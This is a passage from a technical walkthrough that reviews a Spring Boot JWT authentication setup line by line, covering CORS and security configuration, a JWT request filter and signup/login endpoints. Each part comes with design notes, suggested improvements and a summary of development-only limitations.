        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("http://localhost:5173"));  // Vite dev server
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE", "OPTIONS"));
        config.setAllowedHeaders(List.of("*"));  // Accept any header (including Authorization)
        config.setAllowCredentials(true);         // Allow cookies/auth headers
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/**", config);
        return source;
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        // BCrypt with default strength (10).
        // Production: new BCryptPasswordEncoder(12) for stronger hashing.
        return new BCryptPasswordEncoder();
    }

    @Bean
    public AuthenticationManager authenticationManager(
            AuthenticationConfiguration config) throws Exception {
        // Exposes Spring's AuthenticationManager for potential future use
        // (e.g., programmatic authentication in a controller)
        return config.getAuthenticationManager();
    }
}
```

**Design decisions:**
- Lambda DSL (`.cors(cors -> ...)`) — Spring Security 6+ style, replaces deprecated `.cors().and()` chaining
- `STATELESS` session — fundamental to JWT architecture
- `permitAll` only for `/api/auth/**` — principle of least privilege
- `addFilterBefore` — ensures JWT is checked before Spring's default authentication mechanisms

**Potential improvements:**
- Read CORS origin from config: `@Value("${cors.allowed-origin}")` 
- Add method-level security: `@EnableMethodSecurity` for `@PreAuthorize` annotations
- Add security headers: `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`

### 16.4 JwtAuthFilter — Line-by-Line Review

```java
@Component
@RequiredArgsConstructor
public class JwtAuthFilter extends OncePerRequestFilter {
    // OncePerRequestFilter guarantees this filter runs exactly once per request,
    // even if the request is internally forwarded (e.g., to an error page).

    private final JwtService jwtService;

    @Override
    protected void doFilterInternal(
            HttpServletRequest request,
            HttpServletResponse response,
            FilterChain filterChain) throws ServletException, IOException {

        // Step 1: Extract the Authorization header
        String authHeader = request.getHeader("Authorization");

        // Step 2: If no header or wrong format, skip — request proceeds unauthenticated
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            filterChain.doFilter(request, response);
            return;
        }

        // Step 3: Extract the token (everything after "Bearer ")
        String token = authHeader.substring(7);

        // Step 4: Validate the token (signature + expiration)
        if (jwtService.isTokenValid(token)) {
            // Step 5: Extract user identity from token
            String email = jwtService.extractEmail(token);

            // Step 6: Only set authentication if not already set (idempotent)
            if (SecurityContextHolder.getContext().getAuthentication() == null) {
                // Step 7: Create Spring Security authentication object
                UsernamePasswordAuthenticationToken authToken =
                        new UsernamePasswordAuthenticationToken(
                                email,    // principal — the authenticated user's identity
                                null,     // credentials — null because we already validated via JWT
                                List.of(new SimpleGrantedAuthority("ROLE_USER"))
                        );
                // Step 8: Attach request details (IP, session ID) for audit purposes
                authToken.setDetails(
                    new WebAuthenticationDetailsSource().buildDetails(request));
                // Step 9: Set the authentication on the thread-local SecurityContext
                SecurityContextHolder.getContext().setAuthentication(authToken);
            }
        }

        // Step 10: Continue the filter chain regardless of authentication result.
        // If authentication wasn't set, the authorization check in SecurityConfig
        // will reject the request and invoke JwtAuthEntryPoint.
        filterChain.doFilter(request, response);
    }

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        // Skip this filter entirely for auth endpoints — they don't need token validation.
        // This is an optimization and also prevents confusing log noise.
        return request.getServletPath().startsWith("/api/auth/");
    }
}
```

**Design decisions:**
- `shouldNotFilter()` — cleaner than putting an if-check inside `doFilterInternal()`
- `credentials = null` — the JWT itself is the credential, already validated
- Idempotent check (`getAuthentication() == null`) — prevents double-setting
- `filterChain.doFilter()` always called — the filter never blocks; it either sets auth or doesn't

**Potential improvements:**
- Read role from JWT claims instead of hardcoding `ROLE_USER`
- Add structured logging for failed validation (for security monitoring)
- Lookup user from database/cache to ensure they haven't been deactivated since the token was issued

### 16.5 AuthController — Line-by-Line Review

```java
@RestController                    // Combines @Controller + @ResponseBody (JSON responses)
@RequestMapping("/api/auth")       // Base path for all endpoints in this controller
@RequiredArgsConstructor
public class AuthController {

    private final AuthService authService;  // Business logic — controller stays thin

    @PostMapping("/signup")
    public ResponseEntity<AuthResponse> register(
            @Valid @RequestBody RegisterRequest request) {
        // @Valid triggers Jakarta Validation on RegisterRequest fields.
        // If validation fails, Spring returns 400 BEFORE this method is called.
        // @RequestBody deserializes JSON to RegisterRequest using Jackson.
        try {
            AuthResponse response = authService.register(request);
            return ResponseEntity.status(HttpStatus.CREATED).body(response);
            // 201 Created — semantically correct for resource creation
        } catch (UserAlreadyExistsException e) {
            return ResponseEntity.status(HttpStatus.CONFLICT)
                    .body(AuthResponse.builder().message(e.getMessage()).build());
            // 409 Conflict — email already exists
        }
    }

    @PostMapping("/login")
    public ResponseEntity<AuthResponse> login(
            @Valid @RequestBody LoginRequest request) {
        try {
            AuthResponse response = authService.login(request);
            return ResponseEntity.ok(response);
            // 200 OK — successful authentication
        } catch (InvalidCredentialsException e) {
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED)
                    .body(AuthResponse.builder().message(e.getMessage()).build());
            // 401 Unauthorized — wrong email or password
        }
    }
}
```

**Design decisions:**
- `@RestController` — all responses are JSON (no view resolution)
- Controller is thin — delegates all logic to `AuthService`
- `@Valid` on the parameter — triggers validation before the method executes
- Specific HTTP status codes — 201 for creation, 409 for conflict, 401 for auth failure
- Try-catch per endpoint — explicit error handling (will be replaced by `@ControllerAdvice`)

**Potential improvements:**
- Replace try-catch with `@RestControllerAdvice` global exception handler
- Add `@Operation` (Swagger/OpenAPI) annotations for API documentation
- Return `URI` in the `Location` header on 201 (REST best practice)

---

## Summary

This authentication system implements the **complete JWT lifecycle** using Spring Boot and Spring Security:

1. **Registration** validates input, hashes passwords with BCrypt, and stores users
2. **Login** verifies credentials and issues a signed JWT with HS256
3. **JwtAuthFilter** intercepts every request, validates the Bearer token, and sets the SecurityContext
4. **SecurityConfig** defines which endpoints are public and which require authentication
5. **The frontend** stores the token in localStorage and sends it with every API request

**Current limitations** (acceptable for development):
- In-memory user store (no persistence across restarts)
- JWT secret hardcoded in properties
- No refresh token flow
- 24-hour token expiry (should be 15 minutes in production)
- localStorage token storage (vulnerable to XSS)

**The architecture is production-ready in structure** — connecting PostgreSQL, adding refresh tokens, and externalizing secrets are additive changes that don't require restructuring the existing code.
